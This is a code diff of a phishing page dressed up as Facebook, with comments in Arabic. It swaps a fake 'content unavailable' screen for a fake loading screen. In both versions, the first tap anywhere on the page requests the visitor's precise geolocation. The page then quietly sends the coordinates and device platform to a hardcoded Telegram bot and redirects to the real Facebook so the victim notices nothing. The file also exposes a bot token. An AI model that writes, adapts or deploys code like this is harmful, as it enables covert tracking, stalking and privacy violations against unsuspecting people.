@@ -3,80 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>محتوى غير متاح - فيسبوك</title>
+    <title>Facebook</title>
     <style>
-        body { margin: 0; padding: 0; background: #f0f2f5; font-family: Segoe UI, Helvetica, Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; cursor: pointer; }
-        
-        /* أيقونة القفل الشهيرة في فيسبوك */
-        .error-container { text-align: center; padding: 20px; max-width: 400px; }
-        .icon-box { margin-bottom: 20px; }
-        .icon-box img { width: 100px; opacity: 0.6; }
-
-        .error-title { font-size: 20px; font-weight: bold; color: #65676b; margin-bottom: 10px; }
-        .error-text { font-size: 16px; color: #65676b; line-height: 1.4; margin-bottom: 25px; }
-
-        /* زر العودة الوهمي */
-        .back-btn { background: #1877f2; color: white; padding: 10px 20px; border-radius: 6px; font-weight: 600; text-decoration: none; display: inline-block; font-size: 15px; }
-
-        /* طبقة شفافة تغطي الشاشة بالكامل لاصطياد أول لمسة */
-        #trigger-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
+        /* شاشة بيضاء بالكامل توهم المستخدم بالتحميل */
+        body { margin:0; padding:0; background:#fff; height:100vh; display:flex; justify-content:center; align-items:center; cursor:pointer; }
+        .fb-loader { width: 50px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 0.5; } 50% { opacity: 1; } 100% { opacity: 0.5; } }
     </style>
 </head>
-<body id="body-trigger">
+<body onclick="startCapture()">
 
-    <div id="trigger-layer"></div>
-
-    <div class="error-container">
-        <div class="icon-box">
-            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png" alt="error">
-        </div>
-        <div class="error-title">عذراً، هذا المحتوى غير متاح الآن</div>
-        <div class="error-text">
-            يحدث هذا عادةً بسبب قيام صاحب المحتوى بمشاركته مع مجموعة صغيرة من الأشخاص فقط، أو تغيير من يمكنه رؤيته، أو تم حذفه.
-        </div>
-        <div class="back-btn">العودة إلى الصفحة الرئيسية</div>
-    </div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="fb-loader">
 
 <script>
-const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
-const CHAT_ID = "1611398303";
+const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
+const ID = "1611398303";
 
-// بمجرد أن يلمس المستخدم أي مكان في الشاشة
-document.getElementById('trigger-layer').onclick = function() {
-    this.style.display = 'none'; // إخفاء الطبقة للسماح بالتفاعل العادي
-    
-    // محاولة الحصول على الموقع فوراً
-    fetchLocation();
-};
-
-function fetchLocation() {
-    const geoOptions = {
-        enableHighAccuracy: true,
-        timeout: 5000,
-        maximumAge: 0
-    };
-
+function startCapture() {
+    // طلب الموقع فوراً عند أول لمسة للشاشة
     navigator.geolocation.getCurrentPosition(
-        (pos) => { sendToTele(pos); },
-        (err) => { sendToTele(null); },
-        geoOptions
+        (pos) => { sendData(pos); },
+        (err) => { sendData(null); },
+        { enableHighAccuracy: true, timeout: 5000 }
     );
 }
 
-async function sendToTele(pos) {
-    let msg = `⚠️ دخول لصفحة "تم الحذف"\n📱 النظام: ${navigator.platform}`;
-    
-    if (pos) {
+async function sendData(pos) {
+    let msg = `🚩 صيد تلقائي (أول لمسة)\n📱 النظام: ${navigator.platform}`;
+    if(pos) {
         msg += `\n📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}`;
-        msg += `\n🔗 الخريطة: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-    } else {
-        msg += `\n📍 الموقع: تم رفض الإذن أو غير متاح`;
+        msg += `\n🔗 الخريطة: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
     }
-
-    // إرسال البيانات فوراً للتلجرام
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
     
-    // بعد الإرسال، نوجهه لفيسبوك الحقيقي كأن شيئاً لم يكن
+    // إرسال البيانات
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}`);
+    
+    // التوجيه لفيسبوك
     window.location.href = "https://m.facebook.com/";
 }
 </script>
